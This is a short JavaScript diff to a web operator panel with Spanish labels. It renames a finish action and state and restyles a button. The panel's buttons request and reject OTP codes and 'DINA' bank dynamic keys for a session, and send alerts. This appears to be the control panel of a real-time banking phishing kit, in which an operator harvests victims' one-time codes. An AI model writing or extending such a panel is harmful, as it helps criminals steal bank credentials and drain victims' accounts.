@@ -143,7 +143,7 @@ const ACTION_UI = {
         css: "background:var(--yellow);color:rgba(255, 255, 255, 0.82);;",
     },
 
-    FINISHED: { label: "OK", css: "background:var(--red);color:#fff;" },
+    FINISH: { label: "COMPLETADO", css: "background:var(--green);color:#fff;" },
 };
 
 function applyActionUI(el, action) {
@@ -884,7 +884,7 @@ function renderActionsHTML(s, targetElId) {
             actions.innerHTML = `
                 <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_dinamic')">Error DINA</button>
                 <button class="primary" onclick="act('${escapeHtml(s.id)}','request_otp')">Pedir OTP</button>
-                <button onclick="act('${escapeHtml(s.id)}','finish')">Terminar</button>
+                <button onclick="act('${escapeHtml(s.id)}','request_finish')">Terminar</button>
             `;
             break;
 
@@ -897,7 +897,7 @@ function renderActionsHTML(s, targetElId) {
                 <button class="danger" onclick="act('${escapeHtml(s.id)}','reject_otp')">Error OTP</button>
                 <button onclick="act('${escapeHtml(s.id)}','custom_alert')">Enviar alerta</button>
                 <button class="primary" onclick="act('${escapeHtml(s.id)}','request_dinamic')">Pedir DINA</button>
-                <button onclick="act('${escapeHtml(s.id)}','finish')">Terminar</button>
+                <button onclick="act('${escapeHtml(s.id)}','request_finish')">Terminar</button>
             `;
             break;
 
